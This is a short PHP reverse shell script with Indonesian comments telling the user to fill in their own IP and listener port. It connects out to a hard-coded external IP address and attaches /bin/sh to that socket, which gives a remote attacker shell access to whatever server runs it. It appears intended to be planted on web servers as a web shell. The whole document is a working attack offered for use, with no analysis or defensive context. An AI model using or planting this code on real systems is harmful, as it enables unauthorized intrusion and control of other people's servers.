<?php
$ip = '68.183.232.238:9999'; // Ganti dengan IP kamu
$port = 4455; // Ganti dengan port listener kamu
$sock = fsockopen($ip, $port);
$proc = proc_open('/bin/sh', array(0 => $sock, 1 => $sock, 2 => $sock), $pipes);
?>
